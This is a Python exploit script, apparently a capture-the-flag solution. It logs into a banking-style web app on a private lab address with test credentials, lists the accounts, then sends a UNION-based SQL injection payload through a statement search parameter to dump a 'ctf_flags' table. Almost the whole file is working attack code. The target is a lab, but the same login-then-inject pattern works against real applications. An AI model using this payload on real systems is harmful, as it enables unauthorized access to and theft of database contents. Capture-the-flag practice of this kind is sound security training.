#!/usr/bin/env python3
import urllib.request
import urllib.parse
import http.cookiejar
import json

url_base = "http://10.141.199.78:9443"
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

try:
    # Login
    login_url = f"{url_base}/login"
    login_data = urllib.parse.urlencode({
        'email': 'alice@example.com',
        'password': 'password123'
    }).encode()
    req = urllib.request.Request(login_url, data=login_data, method='POST')
    response = opener.open(req, timeout=10)
    print("[+] Logged in")

    # Get account list first
    api_url = f"{url_base}/api/v1/accounts"
    req = urllib.request.Request(api_url)
    response = opener.open(req, timeout=10)
    accounts_data = json.loads(response.read().decode('utf-8'))
    print(f"[+] Got accounts: {accounts_data['count']} accounts")

    if accounts_data['count'] > 0:
        account_id = accounts_data['accounts'][0]['id']
        print(f"[+] Using account ID: {account_id}")

        # Try simple query first
        stmt_url = f"{url_base}/api/v1/accounts/{account_id}/statement?q=test"
        req = urllib.request.Request(stmt_url)
        response = opener.open(req, timeout=10)
        result = json.loads(response.read().decode('utf-8'))
        print(f"[+] Simple query returned {len(result['transactions'])} rows")

        # Now try UNION
        payload = "x' UNION SELECT user_id,vuln_key,flag,flag,flag,flag,flag FROM ctf_flags WHERE 1=1#"
        stmt_url = f"{url_base}/api/v1/accounts/{account_id}/statement?q={urllib.parse.quote(payload)}"
        req = urllib.request.Request(stmt_url)
        response = opener.open(req, timeout=10)
        result = json.loads(response.read().decode('utf-8'))

        print(f"[+] UNION query returned {len(result['transactions'])} rows")

        for tx in result['transactions']:
            if 'BANKSPLOIT' in str(tx):
                print(f"[+] FLAG FOUND: {tx}")
                break

        # Show first transaction to see structure
        if result['transactions']:
            print(f"[+] Sample row: {result['transactions'][0]}")

except Exception as e:
    print(f"Error: {type(e).__name__}: {e}")
